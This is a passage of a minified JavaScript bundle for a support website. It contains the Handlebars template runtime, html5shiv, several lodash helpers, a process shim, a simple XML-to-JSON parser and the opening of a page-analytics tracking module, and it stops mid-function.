i(e){return e&&e.__esModule?e:{default:e}}n.__esModule=!0,n.HandlebarsEnvironment=u;var r=e("./utils"),o=i(e("./exception")),s=e("./helpers"),a=e("./decorators"),c=i(e("./logger"));n.VERSION="4.0.5",n.COMPILER_REVISION=7,n.REVISION_CHANGES={1:"<= 1.0.rc.2",2:"== 1.0.0-rc.3",3:"== 1.0.0-rc.4",4:"== 1.x.x",5:"== 2.0.0-alpha.x",6:">= 2.0.0-beta.1",7:">= 4.0.0"};var l="[object Object]";function u(e,t,n){this.helpers=e||{},this.partials=t||{},this.decorators=n||{},s.registerDefaultHelpers(this),a.registerDefaultDecorators(this)}u.prototype={constructor:u,logger:c.default,log:c.default.log,registerHelper:function(e,t){if(r.toString.call(e)===l){if(t)throw new o.default("Arg not supported with multiple helpers");r.extend(this.helpers,e)}else this.helpers[e]=t},unregisterHelper:function(e){delete this.helpers[e]},registerPartial:function(e,t){if(r.toString.call(e)===l)r.extend(this.partials,e);else{if(void 0===t)throw new o.default('Attempting to register a partial called "'+e+'" as undefined');this.partials[e]=t}},unregisterPartial:function(e){delete this.partials[e]},registerDecorator:function(e,t){if(r.toString.call(e)===l){if(t)throw new o.default("Arg not supported with multiple decorators");r.extend(this.decorators,e)}else this.decorators[e]=t},unregisterDecorator:function(e){delete this.decorators[e]}};var h=c.default.log;n.log=h,n.createFrame=r.createFrame,n.logger=c.default},{"./decorators":460,"./exception":462,"./helpers":463,"./logger":471,"./utils":475}],460:[function(e,t,n){"use strict";n.__esModule=!0,n.registerDefaultDecorators=function(e){r.default(e)};var i,r=(i=e("./decorators/inline"))&&i.__esModule?i:{default:i}},{"./decorators/inline":461}],461:[function(e,t,n){"use strict";n.__esModule=!0;var i=e("../utils");n.default=function(e){e.registerDecorator("inline",(function(e,t,n,r){var o=e;return t.partials||(t.partials={},o=function(r,o){var s=n.partials;n.partials=i.extend({},s,t.partials);var a=e(r,o);return n.partials=s,a}),t.partials[r.args[0]]=r.fn,o}))},t.exports=n.default},{"../utils":475}],462:[function(e,t,n){"use strict";n.__esModule=!0;var i=["description","fileName","lineNumber","message","name","number","stack"];function r(e,t){var n=t&&t.loc,o=void 0,s=void 0;n&&(e+=" - "+(o=n.start.line)+":"+(s=n.start.column));for(var a=Error.prototype.constructor.call(this,e),c=0;c<i.length;c++)this[i[c]]=a[i[c]];Error.captureStackTrace&&Error.captureStackTrace(this,r),n&&(this.lineNumber=o,this.column=s)}r.prototype=new Error,n.default=r,t.exports=n.default},{}],463:[function(e,t,n){"use strict";function i(e){return e&&e.__esModule?e:{default:e}}n.__esModule=!0,n.registerDefaultHelpers=function(e){r.default(e),o.default(e),s.default(e),a.default(e),c.default(e),l.default(e),u.default(e)};var r=i(e("./helpers/block-helper-missing")),o=i(e("./helpers/each")),s=i(e("./helpers/helper-missing")),a=i(e("./helpers/if")),c=i(e("./helpers/log")),l=i(e("./helpers/lookup")),u=i(e("./helpers/with"))},{"./helpers/block-helper-missing":464,"./helpers/each":465,"./helpers/helper-missing":466,"./helpers/if":467,"./helpers/log":468,"./helpers/lookup":469,"./helpers/with":470}],464:[function(e,t,n){"use strict";n.__esModule=!0;var i=e("../utils");n.default=function(e){e.registerHelper("blockHelperMissing",(function(t,n){var r=n.inverse,o=n.fn;if(!0===t)return o(this);if(!1===t||null==t)return r(this);if(i.isArray(t))return t.length>0?(n.ids&&(n.ids=[n.name]),e.helpers.each(t,n)):r(this);if(n.data&&n.ids){var s=i.createFrame(n.data);s.contextPath=i.appendContextPath(n.data.contextPath,n.name),n={data:s}}return o(t,n)}))},t.exports=n.default},{"../utils":475}],465:[function(e,t,n){"use strict";n.__esModule=!0;var i,r=e("../utils"),o=(i=e("../exception"))&&i.__esModule?i:{default:i};n.default=function(e){e.registerHelper("each",(function(e,t){if(!t)throw new o.default("Must pass iterator to #each");var n=t.fn,i=t.inverse,s=0,a="",c=void 0,l=void 0;function u(t,i,o){c&&(c.key=t,c.index=i,c.first=0===i,c.last=!!o,l&&(c.contextPath=l+t)),a+=n(e[t],{data:c,blockParams:r.blockParams([e[t],t],[l+t,null])})}if(t.data&&t.ids&&(l=r.appendContextPath(t.data.contextPath,t.ids[0])+"."),r.isFunction(e)&&(e=e.call(this)),t.data&&(c=r.createFrame(t.data)),e&&"object"==typeof e)if(r.isArray(e))for(var h=e.length;s<h;s++)s in e&&u(s,s,s===e.length-1);else{var d=void 0;for(var p in e)e.hasOwnProperty(p)&&(void 0!==d&&u(d,s-1),d=p,s++);void 0!==d&&u(d,s-1,!0)}return 0===s&&(a=i(this)),a}))},t.exports=n.default},{"../exception":462,"../utils":475}],466:[function(e,t,n){"use strict";n.__esModule=!0;var i,r=(i=e("../exception"))&&i.__esModule?i:{default:i};n.default=function(e){e.registerHelper("helperMissing",(function(){if(1!==arguments.length)throw new r.default('Missing helper: "'+arguments[arguments.length-1].name+'"')}))},t.exports=n.default},{"../exception":462}],467:[function(e,t,n){"use strict";n.__esModule=!0;var i=e("../utils");n.default=function(e){e.registerHelper("if",(function(e,t){return i.isFunction(e)&&(e=e.call(this)),!t.hash.includeZero&&!e||i.isEmpty(e)?t.inverse(this):t.fn(this)})),e.registerHelper("unless",(function(t,n){return e.helpers.if.call(this,t,{fn:n.inverse,inverse:n.fn,hash:n.hash})}))},t.exports=n.default},{"../utils":475}],468:[function(e,t,n){"use strict";n.__esModule=!0,n.default=function(e){e.registerHelper("log",(function(){for(var t=[void 0],n=arguments[arguments.length-1],i=0;i<arguments.length-1;i++)t.push(arguments[i]);var r=1;null!=n.hash.level?r=n.hash.level:n.data&&null!=n.data.level&&(r=n.data.level),t[0]=r,e.log.apply(e,t)}))},t.exports=n.default},{}],469:[function(e,t,n){"use strict";n.__esModule=!0,n.default=function(e){e.registerHelper("lookup",(function(e,t){return e&&e[t]}))},t.exports=n.default},{}],470:[function(e,t,n){"use strict";n.__esModule=!0;var i=e("../utils");n.default=function(e){e.registerHelper("with",(function(e,t){i.isFunction(e)&&(e=e.call(this));var n=t.fn;if(i.isEmpty(e))return t.inverse(this);var r=t.data;return t.data&&t.ids&&((r=i.createFrame(t.data)).contextPath=i.appendContextPath(t.data.contextPath,t.ids[0])),n(e,{data:r,blockParams:i.blockParams([e],[r&&r.contextPath])})}))},t.exports=n.default},{"../utils":475}],471:[function(e,t,n){"use strict";n.__esModule=!0;var i=e("./utils"),r={methodMap:["debug","info","warn","error"],level:"info",lookupLevel:function(e){if("string"==typeof e){var t=i.indexOf(r.methodMap,e.toLowerCase());e=t>=0?t:parseInt(e,10)}return e},log:function(e){if(e=r.lookupLevel(e),"undefined"!=typeof console&&r.lookupLevel(r.level)<=e){var t=r.methodMap[e];console[t]||(t="log");for(var n=arguments.length,i=Array(n>1?n-1:0),o=1;o<n;o++)i[o-1]=arguments[o];console[t].apply(console,i)}}};n.default=r,t.exports=n.default},{"./utils":475}],472:[function(e,t,n){(function(e){(function(){"use strict";n.__esModule=!0,n.default=function(t){var n=void 0!==e?e:window,i=n.Handlebars;t.noConflict=function(){return n.Handlebars===t&&(n.Handlebars=i),t}},t.exports=n.default}).call(this)}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{}],473:[function(e,t,n){"use strict";n.__esModule=!0,n.checkRevision=function(e){var t=e&&e[0]||1,n=s.COMPILER_REVISION;if(t!==n){if(t<n){var i=s.REVISION_CHANGES[n],r=s.REVISION_CHANGES[t];throw new o.default("Template was precompiled with an older version of Handlebars than the current runtime. Please update your precompiler to a newer version ("+i+") or downgrade your runtime to an older version ("+r+").")}throw new o.default("Template was precompiled with a newer version of Handlebars than the current runtime. Please update your runtime to a newer version ("+e[1]+").")}},n.template=function(e,t){if(!t)throw new o.default("No environment passed to template");if(!e||!e.main)throw new o.default("Unknown template object: "+typeof e);e.main.decorator=e.main_d,t.VM.checkRevision(e.compiler);var n={strict:function(e,t){if(!(t in e))throw new o.default('"'+t+'" not defined in '+e);return e[t]},lookup:function(e,t){for(var n=e.length,i=0;i<n;i++)if(e[i]&&null!=e[i][t])return e[i][t]},lambda:function(e,t){return"function"==typeof e?e.call(t):e},escapeExpression:r.escapeExpression,invokePartial:function(n,i,s){s.hash&&(i=r.extend({},i,s.hash),s.ids&&(s.ids[0]=!0)),n=t.VM.resolvePartial.call(this,n,i,s);var a=t.VM.invokePartial.call(this,n,i,s);if(null==a&&t.compile&&(s.partials[s.name]=t.compile(n,e.compilerOptions,t),a=s.partials[s.name](i,s)),null!=a){if(s.indent){for(var c=a.split("\n"),l=0,u=c.length;l<u&&(c[l]||l+1!==u);l++)c[l]=s.indent+c[l];a=c.join("\n")}return a}throw new o.default("The partial "+s.name+" could not be compiled when running in runtime-only mode")},fn:function(t){var n=e[t];return n.decorator=e[t+"_d"],n},programs:[],program:function(e,t,n,i,r){var o=this.programs[e],s=this.fn(e);return t||r||i||n?o=a(this,e,s,t,n,i,r):o||(o=this.programs[e]=a(this,e,s)),o},data:function(e,t){for(;e&&t--;)e=e._parent;return e},merge:function(e,t){var n=e||t;return e&&t&&e!==t&&(n=r.extend({},t,e)),n},noop:t.VM.noop,compilerInfo:e.compiler};function i(t){var r=arguments.length<=1||void 0===arguments[1]?{}:arguments[1],o=r.data;i._setup(r),!r.partial&&e.useData&&(o=l(t,o));var s=void 0,a=e.useBlockParams?[]:void 0;function c(t){return""+e.main(n,t,n.helpers,n.partials,o,a,s)}return e.useDepths&&(s=r.depths?t!==r.depths[0]?[t].concat(r.depths):r.depths:[t]),(c=u(e.main,c,n,r.depths||[],o,a))(t,r)}return i.isTop=!0,i._setup=function(i){i.partial?(n.helpers=i.helpers,n.partials=i.partials,n.decorators=i.decorators):(n.helpers=n.merge(i.helpers,t.helpers),e.usePartial&&(n.partials=n.merge(i.partials,t.partials)),(e.usePartial||e.useDecorators)&&(n.decorators=n.merge(i.decorators,t.decorators)))},i._child=function(t,i,r,s){if(e.useBlockParams&&!r)throw new o.default("must pass block params");if(e.useDepths&&!s)throw new o.default("must pass parent depths");return a(n,t,e[t],i,0,r,s)},i},n.wrapProgram=a,n.resolvePartial=function(e,t,n){return e?e.call||n.name||(n.name=e,e=n.partials[e]):e="@partial-block"===n.name?n.data["partial-block"]:n.partials[n.name],e},n.invokePartial=function(e,t,n){n.partial=!0,n.ids&&(n.data.contextPath=n.ids[0]||n.data.contextPath);var i=void 0;if(n.fn&&n.fn!==c&&(n.data=s.createFrame(n.data),(i=n.data["partial-block"]=n.fn).partials&&(n.partials=r.extend({},n.partials,i.partials))),void 0===e&&i&&(e=i),void 0===e)throw new o.default("The partial "+n.name+" could not be found");if(e instanceof Function)return e(t,n)},n.noop=c;var i,r=function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var n in e)Object.prototype.hasOwnProperty.call(e,n)&&(t[n]=e[n]);return t.default=e,t}(e("./utils")),o=(i=e("./exception"))&&i.__esModule?i:{default:i},s=e("./base");function a(e,t,n,i,r,o,s){function a(t){var r=arguments.length<=1||void 0===arguments[1]?{}:arguments[1],a=s;return s&&t!==s[0]&&(a=[t].concat(s)),n(e,t,e.helpers,e.partials,r.data||i,o&&[r.blockParams].concat(o),a)}return(a=u(n,a,e,s,i,o)).program=t,a.depth=s?s.length:0,a.blockParams=r||0,a}function c(){return""}function l(e,t){return t&&"root"in t||((t=t?s.createFrame(t):{}).root=e),t}function u(e,t,n,i,o,s){if(e.decorator){var a={};t=e.decorator(t,a,n,i&&i[0],o,s,i),r.extend(t,a)}return t}},{"./base":459,"./exception":462,"./utils":475}],474:[function(e,t,n){"use strict";function i(e){this.string=e}n.__esModule=!0,i.prototype.toString=i.prototype.toHTML=function(){return""+this.string},n.default=i,t.exports=n.default},{}],475:[function(e,t,n){"use strict";n.__esModule=!0,n.extend=a,n.indexOf=function(e,t){for(var n=0,i=e.length;n<i;n++)if(e[n]===t)return n;return-1},n.escapeExpression=function(e){if("string"!=typeof e){if(e&&e.toHTML)return e.toHTML();if(null==e)return"";if(!e)return e+"";e=""+e}return o.test(e)?e.replace(r,s):e},n.isEmpty=function(e){return!e&&0!==e||!(!u(e)||0!==e.length)},n.createFrame=function(e){var t=a({},e);return t._parent=e,t},n.blockParams=function(e,t){return e.path=t,e},n.appendContextPath=function(e,t){return(e?e+".":"")+t};var i={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#x27;","`":"&#x60;","=":"&#x3D;"},r=/[&<>"'`=]/g,o=/[&<>"'`=]/;function s(e){return i[e]}function a(e){for(var t=1;t<arguments.length;t++)for(var n in arguments[t])Object.prototype.hasOwnProperty.call(arguments[t],n)&&(e[n]=arguments[t][n]);return e}var c=Object.prototype.toString;n.toString=c;var l=function(e){return"function"==typeof e};l(/x/)&&(n.isFunction=l=function(e){return"function"==typeof e&&"[object Function]"===c.call(e)}),n.isFunction=l;var u=Array.isArray||function(e){return!(!e||"object"!=typeof e)&&"[object Array]"===c.call(e)};n.isArray=u},{}],476:[function(e,t,n){t.exports=e("./dist/cjs/handlebars.runtime").default},{"./dist/cjs/handlebars.runtime":458}],477:[function(e,t,n){t.exports=e("handlebars/runtime").default},{"handlebars/runtime":476}],478:[function(e,t,n){!function(e,n){var i,r,o=e.html5||{},s=/^<|^(?:button|map|select|textarea|object|iframe|option|optgroup)$/i,a=/^(?:a|b|code|div|fieldset|h1|h2|h3|h4|h5|h6|i|label|li|ol|p|q|span|strong|style|table|tbody|td|th|tr|ul)$/i,c="_html5shiv",l=0,u={};function h(){var e=m.elements;return"string"==typeof e?e.split(" "):e}function d(e){var t=u[e[c]];return t||(t={},l++,e[c]=l,u[l]=t),t}function p(e,t,i){return t||(t=n),r?t.createElement(e):(i||(i=d(t)),!(o=i.cache[e]?i.cache[e].cloneNode():a.test(e)?(i.cache[e]=i.createElem(e)).cloneNode():i.createElem(e)).canHaveChildren||s.test(e)||o.tagUrn?o:i.frag.appendChild(o));var o}function f(e){e||(e=n);var t=d(e);return!m.shivCSS||i||t.hasCSS||(t.hasCSS=!!function(e,t){var n=e.createElement("p"),i=e.getElementsByTagName("head")[0]||e.documentElement;return n.innerHTML="x<style>article,aside,dialog,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}mark{background:#FF0;color:#000}template{display:none}</style>",i.insertBefore(n.lastChild,i.firstChild)}(e)),r||function(e,t){t.cache||(t.cache={},t.createElem=e.createElement,t.createFrag=e.createDocumentFragment,t.frag=t.createFrag()),e.createElement=function(n){return m.shivMethods?p(n,e,t):t.createElem(n)},e.createDocumentFragment=Function("h,f","return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&&("+h().join().replace(/[\w\-:]+/g,(function(e){return t.createElem(e),t.frag.createElement(e),'c("'+e+'")'}))+");return n}")(m,t.frag)}(e,t),e}!function(){try{var e=n.createElement("a");e.innerHTML="<xyz></xyz>",i="hidden"in e,r=1==e.childNodes.length||function(){n.createElement("a");var e=n.createDocumentFragment();return void 0===e.cloneNode||void 0===e.createDocumentFragment||void 0===e.createElement}()}catch(e){i=!0,r=!0}}();var m={elements:o.elements||"abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output picture progress section summary template time video",version:"3.7.3-pre",shivCSS:!1!==o.shivCSS,supportsUnknownElements:r,shivMethods:!1!==o.shivMethods,type:"default",shivDocument:f,createElement:p,createDocumentFragment:function(e,t){if(e||(e=n),r)return e.createDocumentFragment();for(var i=(t=t||d(e)).frag.cloneNode(),o=0,s=h(),a=s.length;o<a;o++)i.createElement(s[o]);return i},addElements:function(e,t){var n=m.elements;"string"!=typeof n&&(n=n.join(" ")),"string"!=typeof e&&(e=e.join(" ")),m.elements=n+" "+e,f(t)}};e.html5=m,f(n),"object"==typeof t&&t.exports&&(t.exports=m)}("undefined"!=typeof window?window:this,document)},{}],479:[function(e,t,n){(function(e){(function(){var i="__lodash_hash_undefined__",r=/[^.[\]]+|\[(?:(-?\d+(?:\.\d+)?)|(["'])((?:(?!\2)[^\\]|\\.)*?)\2)\]/g,o=/\\(\\)?/g,s=/^\[object .+?Constructor\]$/,a={function:!0,object:!0},c=a[typeof n]&&n&&!n.nodeType?n:void 0,l=a[typeof t]&&t&&!t.nodeType?t:void 0,u=m(c&&l&&"object"==typeof e&&e),h=m(a[typeof self]&&self),d=m(a[typeof window]&&window),p=m(a[typeof this]&&this),f=u||d!==(p&&p.window)&&d||h||p||Function("return this")();function m(e){return e&&e.Object===Object?e:null}var _=Array.prototype,v=Object.prototype,g=Function.prototype.toString,y=v.hasOwnProperty,b=v.toString,w=RegExp("^"+g.call(y).replace(/[\\^$.*+?()[\]{}|]/g,"\\$&").replace(/hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g,"$1.*?")+"$"),E=f.Symbol,k=_.splice,x=D(f,"Map"),S=D(Object,"create"),T=E?E.prototype:void 0,C=T?T.toString:void 0;function O(){}function A(e,t){return S?void 0!==e[t]:y.call(e,t)}function L(e){var t=-1,n=e?e.length:0;for(this.clear();++t<n;){var i=e[t];this.set(i[0],i[1])}}function P(e,t){for(var n,i,r=e.length;r--;)if((n=e[r][0])===(i=t)||n!=n&&i!=i)return r;return-1}function D(e,t){var n=e[t];return function(e){return!!R(e)&&(function(e){var t=R(e)?b.call(e):"";return"[object Function]"==t||"[object GeneratorFunction]"==t}(e)||function(e){var t=!1;if(null!=e&&"function"!=typeof e.toString)try{t=!!(e+"")}catch(e){}return t}(e)?w:s).test(function(e){if(null!=e){try{return g.call(e)}catch(e){}try{return e+""}catch(e){}}return""}(e))}(n)?n:void 0}function F(e){var t=typeof e;return"number"==t||"boolean"==t||"string"==t&&"__proto__"!=e||null==e}O.prototype=S?S(null):v,L.prototype.clear=function(){this.__data__={hash:new O,map:x?new x:[],string:new O}},L.prototype.delete=function(e){var t=this.__data__;return F(e)?function(e,t){return A(e,t)&&delete e[t]}("string"==typeof e?t.string:t.hash,e):x?t.map.delete(e):function(e,t){var n=P(e,t);return!(n<0)&&(n==e.length-1?e.pop():k.call(e,n,1),!0)}(t.map,e)},L.prototype.get=function(e){var t=this.__data__;return F(e)?function(e,t){if(S){var n=e[t];return n===i?void 0:n}return y.call(e,t)?e[t]:void 0}("string"==typeof e?t.string:t.hash,e):x?t.map.get(e):function(e,t){var n=P(e,t);return n<0?void 0:e[n][1]}(t.map,e)},L.prototype.has=function(e){var t=this.__data__;return F(e)?A("string"==typeof e?t.string:t.hash,e):x?t.map.has(e):function(e,t){return P(e,t)>-1}(t.map,e)},L.prototype.set=function(e,t){var n=this.__data__;return F(e)?function(e,t,n){e[t]=S&&void 0===n?i:n}("string"==typeof e?n.string:n.hash,e,t):x?n.map.set(e,t):function(e,t,n){var i=P(e,t);i<0?e.push([t,n]):e[i][1]=n}(n.map,e,t),this};var M=I((function(e){var t=[];return function(e){if("string"==typeof e)return e;if(null==e)return"";if(function(e){return"symbol"==typeof e||function(e){return!!e&&"object"==typeof e}(e)&&"[object Symbol]"==b.call(e)}(e))return C?C.call(e):"";var t=e+"";return"0"==t&&1/e==-1/0?"-0":t}(e).replace(r,(function(e,n,i,r){t.push(i?r.replace(o,"$1"):n||e)})),t}));function I(e,t){if("function"!=typeof e||t&&"function"!=typeof t)throw new TypeError("Expected a function");var n=function(){var i=arguments,r=t?t.apply(this,i):i[0],o=n.cache;if(o.has(r))return o.get(r);var s=e.apply(this,i);return n.cache=o.set(r,s),s};return n.cache=new(I.Cache||L),n}function R(e){var t=typeof e;return!!e&&("object"==t||"function"==t)}I.Cache=L,t.exports=M}).call(this)}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{}],480:[function(e,t,n){var i=e("lodash._stringtopath"),r=/\.|\[(?:[^[\]]*|(["'])(?:(?!\1)[^\\]|\\.)*?\1)\]/,o=/^\w*$/,s=Object.prototype.toString;function a(e,t){for(var n,a=0,l=(t=function(e,t){var n=typeof e;return"number"==n||"symbol"==n||!c(e)&&(function(e){return"symbol"==typeof e||function(e){return!!e&&"object"==typeof e}(e)&&"[object Symbol]"==s.call(e)}(e)||o.test(e)||!r.test(e)||null!=t&&e in Object(t))}(t,e)?[t]:c(n=t)?n:i(n)).length;null!=e&&a<l;)e=e[t[a++]];return a&&a==l?e:void 0}var c=Array.isArray;t.exports=function(e,t,n){var i=null==e?void 0:a(e,t);return void 0===i?n:i}},{"lodash._stringtopath":479}],481:[function(e,t,n){var i=/^\s+|\s+$/g,r=/^[-+]0x[0-9a-f]+$/i,o=/^0b[01]+$/i,s=/^0o[0-7]+$/i,a=parseInt,c=Object.prototype.toString,l=Math.max;function u(e){var t=typeof e;return!!e&&("object"==t||"function"==t)}t.exports=function(e,t,n){var h=e?e.length:0;return h?((n=function(e){if(!e)return 0===e?e:0;if(Infinity===(e=function(e){if("number"==typeof e)return e;if(function(e){return"symbol"==typeof e||function(e){return!!e&&"object"==typeof e}(e)&&"[object Symbol]"==c.call(e)}(e))return NaN;if(u(e)){var t=function(e){var t=u(e)?c.call(e):"";return"[object Function]"==t||"[object GeneratorFunction]"==t}(e.valueOf)?e.valueOf():e;e=u(t)?t+"":t}if("string"!=typeof e)return 0===e?e:+e;e=e.replace(i,"");var n=o.test(e);return n||s.test(e)?a(e.slice(2),n?2:8):r.test(e)?NaN:+e}(e))||e===-1/0)return 17976931348623157e292*(e<0?-1:1);var t=e%1;return e==e?t?e-t:e:0}(n))<0&&(n=l(h+n,0)),function(e,t,n){if(t!=t)return function(e,t,n){for(var i=e.length,r=t+-1;++r<i;){var o=e[r];if(o!=o)return r}return-1}(e,n);for(var i=n-1,r=e.length;++i<r;)if(e[i]===t)return i;return-1}(e,t,n)):-1}},{}],482:[function(e,t,n){var i,r,o=t.exports={};function s(){throw new Error("setTimeout has not been defined")}function a(){throw new Error("clearTimeout has not been defined")}function c(e){if(i===setTimeout)return setTimeout(e,0);if((i===s||!i)&&setTimeout)return i=setTimeout,setTimeout(e,0);try{return i(e,0)}catch(t){try{return i.call(null,e,0)}catch(t){return i.call(this,e,0)}}}!function(){try{i="function"==typeof setTimeout?setTimeout:s}catch(e){i=s}try{r="function"==typeof clearTimeout?clearTimeout:a}catch(e){r=a}}();var l,u=[],h=!1,d=-1;function p(){h&&l&&(h=!1,l.length?u=l.concat(u):d=-1,u.length&&f())}function f(){if(!h){var e=c(p);h=!0;for(var t=u.length;t;){for(l=u,u=[];++d<t;)l&&l[d].run();d=-1,t=u.length}l=null,h=!1,function(e){if(r===clearTimeout)return clearTimeout(e);if((r===a||!r)&&clearTimeout)return r=clearTimeout,clearTimeout(e);try{r(e)}catch(t){try{return r.call(null,e)}catch(t){return r.call(this,e)}}}(e)}}function m(e,t){this.fun=e,this.array=t}function _(){}o.nextTick=function(e){var t=new Array(arguments.length-1);if(arguments.length>1)for(var n=1;n<arguments.length;n++)t[n-1]=arguments[n];u.push(new m(e,t)),1!==u.length||h||c(f)},m.prototype.run=function(){this.fun.apply(null,this.array)},o.title="browser",o.browser=!0,o.env={},o.argv=[],o.version="",o.versions={},o.on=_,o.addListener=_,o.once=_,o.off=_,o.removeListener=_,o.removeAllListeners=_,o.emit=_,o.prependListener=_,o.prependOnceListener=_,o.listeners=function(e){return[]},o.binding=function(e){throw new Error("process.binding is not supported")},o.cwd=function(){return"/"},o.chdir=function(e){throw new Error("process.chdir is not supported")},o.umask=function(){return 0}},{}],483:[function(e,t,n){"use strict";t.exports={xml2json:function e(t){return function(t){for(var n,i,r,o,s,a={};t.match(/<[^\/][^>]*>/);)n=(s=t.match(/<[^\/][^>]*>/)[0]).substring(1,s.length-1),-1==(i=t.indexOf(s.replace("<","</")))&&(n=s.match(/[^<][\w+$]*/)[0],-1==(i=t.indexOf("</"+n))&&(i=t.indexOf("<\\/"+n))),o=(r=t.substring(s.length,i)).match(/<[^\/][^>]*>/)?e(r):r,void 0===a[n]?a[n]=o:Array.isArray(a[n])?a[n].push(o):a[n]=[a[n],o],t=t.substring(2*s.length+1+r.length);return a}(t=function(e){return function(e){var t=e.match(/<[^\/][^>][^<]+\s+.[^<]+[=][^<]+>/g);if(t)for(var n=0;n<t.length;n++){var i=t[n],r="<"+i.match(/[^<][\w+$]*/)[0]+">",o=i.match(/(\S+)=["']?((?:.(?!["']?\s+(?:\S+)=|[>"']))+.)["']?/g);if(o)for(var s=0;s<o.length;s++){var a=o[s],c=a.substring(0,a.indexOf("="));r+="<"+c+">"+a.substring(a.indexOf('"')+1,a.lastIndexOf('"'))+"</"+c+">"}e=e.replace(i,r)}return e}(e=function(e){var t=e.match(/<[^\/][^>][^<]+\s+.[^<]+[=][^<]+>{1}([^<]+)/g);if(t)for(var n=0;n<t.length;n++){var i=t[n],r=i.substring(0,i.indexOf(">")+1)+"<_@ttribute>"+i.substring(i.indexOf(">")+1)+"</_@ttribute>";e=e.replace(i,r)}return e}(e=function(e){var t=e.match(/<[^/][^>]*\/>/g);if(t)for(var n=0;n<t.length;n++){var i=t[n],r=i.substring(0,i.length-2);r+=">";var o=i.match(/[^<][\w+$]*/)[0],s="</"+o+">",a="<"+o+">",c=r.match(/(\S+)=["']?((?:.(?!["']?\s+(?:\S+)=|[>"']))+.)["']?/g);if(c)for(var l=0;l<c.length;l++){var u=c[l],h=u.substring(0,u.indexOf("="));a+="<"+h+">"+u.substring(u.indexOf('"')+1,u.lastIndexOf('"'))+"</"+h+">"}a+=s,e=e.replace(i,a)}return e}(e=(e=(e=(e=(e=e.replace(/<!--[\s\S]*?-->/g,"")).replace(/\n|\t|\r/g,"")).replace(/ {1,}<|\t{1,}</g,"<")).replace(/> {1,}|>\t{1,}/g,">")).replace(/<\?[^>]*\?>/g,""))))}(t))}}},{}],484:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-events/utils/addEventListener"),r=e("@marcom/ac-object/create"),o=e("@marcom/ac-event-emitter").EventEmitter,s=(e("@marcom/ac-dom-traversal/querySelector"),e("@marcom/ac-dom-traversal/querySelectorAll"));const a=document.querySelector('meta[name="analytics:s-pagename"]'),c=null!==(l=document.querySelector('meta[name="analytics:s-runmode"]'))&&"black"===l.content.toLowerCase()?"black":"white";var l;const u=window.location.origin;window._applemd={};const h=(d=document.querySelector('meta[name="secureMatrixURL"]'))?d.content:"https://supportmetrics.apple.com/content/services/stats";var d,p=function(){return{init:this.init()}},f=p.prototype=r(o.prototype);function m(e){return/(http|https):\/\/(\w+:{0,1}\w*)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%!\-\/]))?/.test(e)?e:u+e}function _(e,t,n,i){window._applemd&&(window._applemd=Object.assign(window._applemd,e),window._satellite&&"white"===t&&window._satellite.track(n)),i&&setTimeout(i)}function v(e,t,n){window._applemd&&window.NN&&"white"===t&&("load"===n?(window.NN.default.init({source:"ss-pages",appDataSchemaVersion:"2.0.0",reportThrottledWebVitalDataTypes:["system:dom-content-loaded","system:load","system:unfocus","system:focus","system:unload","system:page-hide","system:visibility-change-visible","system:visibility-change-hidden","system:event","app:load","app:unload","app:event"],webVitalDataThrottlingPercentage:100,trackMarcomSearch:!0,trackSurvey:!0,endpoint:h}),window.NN.default.load({page:e.page})):"link"===n?window.NN.default.action({page:e.page,component:e.component}):"video"===n?window.NN.default.action({page:e.page,video:e.video}):window.NN.default.action({page:e.page,search:e.search}))}function g(){const e={serviceProvider:"as-service-provider-wrapper",survey:"as-survey-form"};if(function(){var e=document.querySelector('meta[name="o:token"]'),t=document.querySelector('meta[name="o:testid"]');if(null!==e&&""!==e.content&&null!==t&&""!==t.content)return!0}())return!0;var t,n=!1;for(t in e)null!==document.querySelector("."+e[t])&&(n=!0);return n}f.init=function(){this._bindSatelliteTrackFns(),this._pageMetaValidator(),this._addClickEventsListener()},f._bindSatelliteTrackFns=function(){window.launchPageLoadTrackFn=function(e){var t={};e=e||null;var n=g();if(null==e){const e=a.content.split("::").length,i=a.content.split("::")[2],r=a.content.split("::")[3],o=a.content.split("::")[e-1].split(" ")[0],s=a.content.split("::")[e-1].split("(")[1].split(")")[0].split("_").join("-").toLowerCase(),l="support",u="error"===i?"bonsai-error":"",h=a.content.split("::")[1];t.page={},t.page.site_section=i,t.page.content_type=r,t.page.content_subtype=o,t.page.locale=s,"survey"!==i&&"other"!==i&&(t.page.platform=l),"survey"===i?(t.page.content_type=i,t.page.site_section=h,t.page.content_subtype=o.split("-").join(" ")):"error"===i&&(t.page.error=u),n||_(t,c,"acs.pageload")}else v(t=e,c,"load"),_(t,c,"acs.pageload");return window._applemd=t,window._applemd},window.launchLinkClickTrackFn=function(e){var t,n,i,r,o=window._applemd,s=e.currentTarget,a="data-analytics-link-component_type",l="data-analytics-link-component_name",u=s.closest(".as-contentblock-block"),h=s.closest('div[data-analytics-link-component_type="Container"]'),d=s.closest(".as-thumbnail-box");if(null!==h&&"Container"===h.dataset.analyticsLinkComponent_type)n=h.getAttribute(a).toLowerCase(),i=h.getAttribute(l).toLowerCase(),r=m(s.getAttribute("href")),"Simple List"===s.getAttribute(a)&&(i=s.getAttribute(l));else if(null!==u&&u.classList.contains("as-contentblock-block")&&null===s.getAttribute(a))n=s.closest(".as-richtext").getAttribute(a).toLowerCase(),i=s.textContent.trim().toLowerCase(),r=m(s.getAttribute("href"));else if(null!==d&&d.classList.contains("as-thumbnail-box")&&null===s.getAttribute(a))n=d.querySelector(".as-thumbnail").getAttribute(a).toLowerCase(),i=s.textContent.trim().toLowerCase(),r=m(s.getAttribute("href"));else if(s.getAttribute(a)){if(n=s.getAttribute(a).toLowerCase(),i=s.getAttribute(l).toLowerCase(),"content block"===n){var p=s.closest(".as-contentblock-block").querySelector(".as-contentblock-title");p=null===p.getAttribute(a)?p.textContent:p.getAttribute(l),i=i+"::"+(p="default-contentblock"===i?"default-contentblock":p)}else if("video"===n){var 